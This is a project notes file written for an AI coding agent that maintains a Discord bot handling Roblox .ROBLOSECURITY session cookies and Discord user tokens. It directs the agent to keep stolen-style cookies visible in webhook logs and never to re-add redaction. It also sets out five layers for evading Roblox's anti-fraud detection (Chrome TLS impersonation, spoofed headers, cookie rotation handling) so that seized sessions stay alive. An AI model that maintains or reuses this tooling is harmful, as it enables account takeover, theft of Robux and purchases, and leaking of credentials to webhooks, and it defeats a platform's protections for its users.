# Logs Bot — Project Notes for Codex

Keep this file **tight**. It's auto-loaded every session. For anything long, put it in
`C:\Users\min\Desktop\Codex .md files\` and read it on demand.

## What this is
A Discord bot (discord.py, cogs) with two tool families: **mod/investigation** slash
commands (friend graphs, ban tickets, cheating-server scans) and **Roblox account
management** via `.ROBLOSECURITY` cookie commands (built but currently unloaded).
Deployed to Railway.

## Paths
- Project root: `C:\Users\min\Desktop\Logs Bot\`
- Commands: `commands/*.py` (one cog per command)
- Core logic: `core/*.py`
- Extended notes (read on demand): `C:\Users\min\Desktop\Codex .md files\`

## Commands

Loaded cogs are listed in `bot.py` → `COGS`. Only those sync to Discord.

### Public slash (anyone can run)
- `/connections` — Roblox friend list / friend-connection graph
- `/feedback` — user feedback modal, posts to feedback channel
- `/bancheckv2` — search mod server ticket channel names for a Roblox username
- `/reportercheck` — which ticket/report channels a Discord user has access to
- `/help` — command directory

### Gated slash
- `/in-cheating-servers` — check if a Discord user is in known Roblox cheating servers.
  **Runner must be whitelisted** (DB table `cheating_server_whitelist`; grant via `?whitelist`).
  Bot-owner IDs in `MIN_USER_IDS` and the whitelist manager bypass the DB check.
- `/status info` — owner-only per-Discord-user dashboard (`BOT_OWNER_IDS` env override)
- `/owner-commanddisabler` — owner-only runtime disable/enable/list slash commands (`BOT_OWNER_IDS` env override)
- `/owner-dmuser` — owner-only DM a tracked bot user (`BOT_OWNER_IDS` env override)

### Prefix commands (loaded)
- `?whitelist` / `?wl` — grant `/in-cheating-servers` access (`CHEATING_SERVER_WHITELIST_MANAGER_IDS`)
- `?accountstatus` / `?ts` / `?tokenstatus` — Discord user-token health (owner + `ACCOUNT_STATUS_ALLOWED_IDS`)

### Not loaded (cog on disk, **not** in `bot.py` COGS — won't sync or appear in `/help`)
- `/accountchecker` — Roblox account snapshot (Robux, RAP, email, 2FA, …)
- `/cookierefresher` — rotate `.ROBLOSECURITY`
- `/autobuygamepass` — purchase a gamepass
- `/creategamepass` — create a gamepass
- `/monitoraccount` — live account monitor (`MONITOR_WHITELIST` when loaded)

### Background (not a slash command)
- `core/channel_monitor.py` — Gateway listener; forwards monitored `#hacker-proof` messages to webhooks

## Rules
- **Don't add auth gates to commands unless explicitly asked.** Existing gates are listed above — don't remove them without being asked either.
- **Normal command output is public** (non-ephemeral) in the channel where it was run.
- **Cookies must be visible in webhook logs.** Don't add redaction/sensitive-keyword filters.
- Cookies wrapped in single or triple backticks are accepted — handled by `core/utils.py :: sanitize_cookie`.
- Never commit `.env` or tokens.
- **`ephemeral=True` IS allowed for these specific cases (don't remove):**
  - Rotated-cookie followups (visible to user only, but cookie still goes to webhook log).
  - Pagination/owner-only button guards ("only the command runner can use these buttons").
  - Expired-panel notices after a bot restart.
  - Modal "couldn't find record" errors.

## Deploy
Fast path: `railway up` (uploads local code without GitHub round-trip).
`.railwayignore` excludes `__pycache__`, `.env`, `.git`.

## Working custom emoji IDs
- `<a:arrow:1497344031238127686>` — animated decoration
- `<:clipboard:1497344037294702762>` — process log header
- `<:check:1497344035696672959>` — success
- `<:x:1497344061592436737>` — error
- `<:warning:1497344059017003079>` — warning
- `<a:mag:1497344052709036125>` — account checker
- `<:cart:1497344033553514627>` — autobuy
- `<:gamepass:1497344044811030548>` — create gamepass
- `<a:moneybag:1497344054990733535>` — robux
- `<a:crown:1497344039584923778>` — premium
- `<:lock:1497344050078941344>` — 2FA
- `<:email:1497344042076344350>` — email
- `<a:anipinkarrow:1497344028004581386>` — bancheck primary arrow
- `<:greencheck:1497344048267137144>` — bancheck secondary check
- `<:redcheck:1497344057041752235>` — bancheck error indicator
- `<a:exploiters:1498648559623344158>` — bancheck exploiters indicator

## Known Roblox gotcha (CRITICAL — read before touching ANY auth code)

**This took weeks to get right. If cookies start dying "for no reason" after a change,
the answer is almost always in this section. Do not deviate.**

The "log in → instantly logged out" symptom is caused by Roblox's anti-fraud system
fingerprinting non-browser HTTP clients and either (a) rotating `.ROBLOSECURITY` so
aggressively that any extracted value is dead the moment you read it, or (b) flagging
the session as compromised so the next login attempt invalidates it.

There are **FIVE layers** that all have to be correct simultaneously. Removing or
"simplifying" any one of them brings the bug back.

### Layer 1: TLS fingerprint must look like Chrome
- We use `curl_cffi` with `impersonate="chrome"` (see `core/utils.py :: ROBLOX_IMPERSONATE`).
- `curl_cffi` mimics Chrome's exact TLS handshake (JA3/JA4, cipher order, ALPN, extensions).
- Plain `requests` / `httpx` / `aiohttp` **WILL NOT WORK** here. Roblox JA3-fingerprints them
  and kills sessions. Do not "simplify" curl_cffi out of the codebase.
- `requirements.txt` pins `curl_cffi==0.15.0` exactly. **Do not bump** without testing
  every cookie command end-to-end — newer versions have changed impersonation behavior
  and broken Roblox compatibility before.

### Layer 2: Headers must match a current Chrome version
- Full Chrome header set lives in `core/utils.py :: BROWSER_HEADERS`. All of
  `User-Agent`, `sec-ch-ua`, `sec-ch-ua-mobile`, `sec-ch-ua-platform`, `Sec-Fetch-*`,
  `Origin`, `Referer`, `Priority`, `Accept-Language` must be present.
- `CHROME_MAJOR` (currently `147`) is interpolated into both `User-Agent` and `sec-ch-ua`.
  **If cookies start dying again "out of nowhere," bump this first** — Chrome stable
  auto-updates every ~4 weeks and Roblox eventually flags stale versions.
  Check current Chrome stable: https://chromiumdash.appspot.com/releases?platform=Windows
- Do not add or remove headers. Do not change the `sec-ch-ua` quoted format. Do not
  drop `Origin`/`Referer` — Roblox uses them for CSRF correlation.

### Layer 3: Always use the session jar, never extract cookies manually
- Build sessions through `core/utils.py :: make_roblox_session(cookie)`. Never construct
  a `curl_cffi.requests.Session()` by hand in command code.
- Roblox sends a fresh `.ROBLOSECURITY` via `Set-Cookie` on **every authenticated
  response**. The session jar absorbs this automatically — your job is to read the
  jar at the end, never parse `Set-Cookie` headers yourself.
- **Anti-pattern that caused weeks of pain (do NOT reintroduce):**
  ```python
  # BROKEN — extracts cookie mid-flow then rotates it dead
  new_cookie = response.headers["set-cookie"].split(".ROBLOSECURITY=")[1]...
  session.get("/users/authenticated")  # ← this rotates new_cookie, killing it
  return new_cookie  # already invalid by the time the user sees it
  ```
- **Correct pattern (used by `core/refresh.py` and `core/account_checker.py`):**
  ```python
  # ... do all auth calls through session ...
  fresh_cookie = session.cookies.get(".ROBLOSECURITY")  # ← LAST step, after final call
  ```

### Layer 4: Don't send the cookie to public endpoints
- Roblox can only rotate a cookie that you sent. Public endpoints (avatar thumbnails,
  collectibles inventory, premium membership, gamepass product-info, friends list)
  do not require auth. Calling them with the cookie wastes a rotation and increases
  risk that the user's "kept" cookie is stale.
- Use `core/utils.py :: roblox_get` / `roblox_post` (cookieless) for public reads.
- Use `make_roblox_session(cookie).get(...)` only for endpoints that require auth:
  `users/authenticated`, `economy/.../currency`, `accountsettings/email`,
  `twostepverification/metadata`, purchase submission, gamepass create/patch,
  CSRF harvesting via `auth.roblox.com/v2/logout`.
- See `core/account_checker.py` for the canonical AUTH vs PUBLIC split. Do not regress
  it back to "send cookie everywhere."

### Layer 5: `record_rotated_cookie` after every command
- Every command that takes a cookie ends with a `record_rotated_cookie(result, session, ...)`
  call. This compares the freshest jar value against the original input and, if Roblox
  rotated it, sets `result["cookie_was_rotated"] = True` + `result["rotated_cookie"]`.
- The cog then DMs / followups the user with the rotated cookie so their saved value
  doesn't go stale silently. Do not remove this — without it, the user's cookie dies
  invisibly after each command.

### Stability anchors (don't change without testing)
- **`runtime.txt` pins `python-3.11.9` — do not bump.** Railway's nixpacks image uses
  this to pull the curl_cffi 0.15.0 prebuilt wheels. Changing the Python version has
  caused cookie invalidation in production before (different curl_cffi wheel / TLS behavior).
- `requirements.txt` pins `curl_cffi==0.15.0` exactly (not `>=`). Same reason.
- All cookie-handling commands run their core logic in `asyncio.to_thread(run_with_cookie_lock, ...)`.
  The `run_with_cookie_lock` serializes calls per-cookie so two concurrent commands
  on the same account don't race each other through Roblox's rotation flow.

### Debugging checklist when cookies start dying again
1. Did Chrome stable advance? → bump `CHROME_MAJOR` in `core/utils.py`.
2. Did `curl_cffi` get accidentally upgraded? → `pip show curl_cffi` should say `0.15.0`.
3. Did someone bump `runtime.txt` or the Railway Python version? → revert and redeploy.
4. Did someone introduce a `requests` / `httpx` / `aiohttp` import in `core/`? → revert it.
5. Did someone send the cookie to a public endpoint? → split it back out.
6. Did someone read the cookie from a `Set-Cookie` header instead of the session jar?
   → use `session.cookies.get(".ROBLOSECURITY")` AFTER the last auth call.
7. Did someone remove `make_roblox_session` and inline `curl_requests.Session(...)`
   without `impersonate="chrome"`? → restore the helper.

`core/refresh.py`, `core/account_checker.py`, `core/autobuy.py`,
`core/create.py`, and `commands/monitor_cmd.py` all follow these rules. **Do not regress.**

## Don't do
- Don't re-introduce `SENSITIVE_KEYWORDS` / redaction in `core/logging.py`.
- Don't add `ephemeral=True` to *normal command output* (rotated-cookie followups + button guards are fine; see Rules).
- Don't add new auth gates to commands unless explicitly asked. Leave existing gates on
  `/in-cheating-servers`, `/status info`, `/owner-*`, `/monitoraccount`, and `?accountstatus` alone.
- **Don't bump `runtime.txt`, Python version, or loosen the `curl_cffi` pin** without full
  end-to-end cookie-command testing — has caused session invalidation before.
- Don't commit without being explicitly asked.
